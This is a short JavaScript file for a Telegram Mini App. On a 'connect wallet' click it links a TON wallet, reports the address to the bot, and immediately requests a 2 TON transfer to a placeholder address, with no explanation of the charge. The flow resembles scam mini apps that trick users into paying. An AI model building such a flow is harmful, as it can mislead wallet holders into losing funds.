let tg = window.Telegram.WebApp;
tg.expand();

async function connectWallet() {
    try {
        const tonConnect = new TonConnect({
            manifestUrl: "https://telegram-mini-app-seven-blond.vercel.app/tonconnect-manifest.json"
        });

        const connectedWallet = await tonConnect.connect();
        if (connectedWallet) {
            const walletAddress = connectedWallet.account.address;
            tg.sendData(JSON.stringify({ wallet: walletAddress }));

            const transaction = {
                to: "EQC3DQ...ЗАМЕНИТЕ_НА_АДРЕС",
                value: "2000000000",
                payload: "",
            };

            await tonConnect.sendTransaction(transaction);
            alert("✅ Транзакция создана! Подтвердите в кошельке.");
        } else {
            console.error("❌ Ошибка: Кошелек не подключился");
        }
    } catch (error) {
        console.error("❌ Ошибка при подключении:", error);
        alert("❌ Ошибка: " + error.message);
    }
}

document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("connect-wallet").addEventListener("click", connectWallet);
});
